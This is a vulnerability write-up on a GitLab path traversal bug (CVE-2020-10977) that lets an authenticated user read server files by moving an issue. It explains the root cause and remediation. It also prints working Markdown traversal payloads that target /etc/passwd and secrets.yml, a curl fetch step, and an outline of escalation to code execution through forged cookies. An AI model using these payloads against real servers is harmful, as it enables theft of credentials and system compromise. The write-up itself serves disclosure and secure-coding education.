# Arbitrary File Read via UploadsRewriter when Moving an Issue (GitLab)

## Overview

This writeup analyzes an Arbitrary File Read vulnerability reported in GitLab (HackerOne #827052), discovered and reported by **@vakzz** on March 23, 2020.

The vulnerability allows an authenticated attacker to read arbitrary files on the server by embedding a path traversal payload inside an issue's Markdown description, then triggering a file copy operation when moving that issue to another project.

- **Category:**
  - OWASP A01:2021 – Broken Access Control
  - Path Traversal / Directory Traversal
  - Arbitrary File Read
- **Severity:** Critical
- **Bounty:** $20,000
- **Affected Versions:** GitLab < 12.9.1
- **CVE:** CVE-2020-10977

---

## Vulnerable Component

```ruby
# lib/gitlab/uploads_rewriter.rb (simplified)

MARKDOWN_PATTERN = %r{\!?\[.*?\]\(/uploads/(?<secret>[0-9a-f]{32})/(?<file>.*?)\)}.freeze

@text.gsub(@pattern) do |markdown|
  file = find_file(@source_project, $~[:secret], $~[:file])
  break markdown unless file.try(:exists?)

  klass = target_parent.is_a?(Namespace) ? NamespaceFileUploader : FileUploader
  moved = klass.copy_to(file, target_parent)
  ...
end

def find_file(project, secret, file)
  uploader = FileUploader.new(project, secret: secret)
  uploader.retrieve_from_store!(file)
  uploader
end
```

---

## Intended Behavior

When an issue is moved from one GitLab project to another, the `UploadsRewriter` scans the issue description for embedded upload references using a Markdown regex pattern.

Example of a legitimate upload reference in Markdown:

```markdown
![image](/uploads/11111111111111111111111111111111/screenshot.png)
```

For each matched reference, `UploadsRewriter` copies the corresponding file from the source project to the target project, then updates the link in the description.

The `find_file` method constructs a file path from two components:
- `secret` — a 32-character hex string (directory name)
- `file` — the filename provided from the Markdown match

---

## Root Cause

The `file` parameter extracted from the Markdown pattern is passed directly into `FileUploader` without any sanitization or path validation:

```ruby
uploader.retrieve_from_store!(file)
```

There is **no check** that `file` resolves to a path within the expected uploads directory.

This means an attacker can inject `../` sequences into the `file` portion of the Markdown URL, causing the uploader to traverse outside the uploads directory and reference arbitrary files on the filesystem.

---

## Exploitation

### Step-by-step

1. Create two projects (Project A and Project B) in GitLab.
2. In Project A, create a new issue with the following description:

```markdown
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

3. Move the issue from Project A to Project B.
4. The `UploadsRewriter` processes the description, calls `find_file` with the traversal path, and copies `/etc/passwd` into Project B's uploads directory.
5. Access the copied file via the newly updated upload link in the moved issue.

### Why it Works

The Markdown pattern captures `../../../../../../../../../../../../../../etc/passwd` as the `file` parameter.

`FileUploader` resolves this relative path against the project's upload directory:

```
/var/opt/gitlab/gitlab-rails/uploads/<project>/<secret>/
  + ../../../../../../../../../../../../../../etc/passwd
= /etc/passwd
```

Because `retrieve_from_store!` does not validate that the resolved path stays within the uploads directory, the file copy proceeds successfully.

---

## Impact

An authenticated attacker (requires a standard GitLab account) can:

- Read arbitrary files accessible by the `git` system user
- Exfiltrate `secrets.yml` to obtain `secret_key_base`
- Use the leaked secret to forge signed cookies → **Remote Code Execution**
- Access database credentials, SSH keys, API tokens, and other sensitive configs

Impact level: **Critical**

---

## Proof of Concept

Steps performed by the attacker in practice (manual):

1. Create Issue in Project A with description:

```markdown
![passwd](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

2. Move the issue to Project B via **Issue > Move Issue**.

3. Navigate to the moved issue in Project B — the image link now points to the copied file:

```
http://<gitlab>/projectB/uploads/<new-secret>/passwd
```

4. Fetch the file:

```bash
curl http://<gitlab>/projectB/uploads/<new-secret>/passwd
```

Output:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

---

## Escalation to RCE

Reading `config/secrets.yml` leaks the Rails `secret_key_base`.

```markdown
![secrets](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)
```

With `secret_key_base`, an attacker can forge a valid Rails signed session cookie and trigger deserialization of a malicious payload → **Remote Code Execution** as the `git` user.

---

## OWASP Mapping

| OWASP Top 10 2021 | Category |
|---|---|
| A01 – Broken Access Control | Accessing files outside the intended upload directory |
| A03 – Injection | Path traversal injected via Markdown input |

---

## Remediation

Validate the resolved file path to ensure it stays within the expected upload directory before performing any file operations.

**Option 1 — Path containment check (Ruby):**

```ruby
def find_file(project, secret, file)
  uploader = FileUploader.new(project, secret: secret)
  uploader.retrieve_from_store!(file)

  # Reject if resolved path escapes the upload root
  raise "Invalid file path" unless uploader.file.path.start_with?(uploader.root)

  uploader
end
```

**Option 2 — Sanitize filename before use:**

```ruby
safe_file = File.basename(file)  # strip all directory components
uploader.retrieve_from_store!(safe_file)
```

**GitLab fix:** Patched in version **12.9.1** by adding path validation inside the `UploadsRewriter`.

---

## Key Takeaways

- **Never trust user-controlled values used to construct file paths** — always validate that the resolved path stays within its intended boundary.
- Path traversal vulnerabilities don't require complex input; `../` sequences embedded in Markdown are enough.
- Arbitrary file read can be a stepping stone to full RCE when sensitive config files (like `secrets.yml`) are exposed.
- Regex patterns that extract filenames from Markdown are user-controlled; treat their output as untrusted input.

---

## References

- [HackerOne Report #827052](https://hackerone.com/reports/827052) — reported by @vakzz
- [GitLab Issue #212175](https://gitlab.com/gitlab-org/gitlab/-/issues/212175)
- [Threatpost — Critical GitLab Flaw Earns $20K Bounty](https://threatpost.com/critical-gitlab-flaw-bounty-20k/155295/)
- [Exploit-DB #48431](https://www.exploit-db.com/exploits/48431)
- [OWASP A01:2021 – Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)
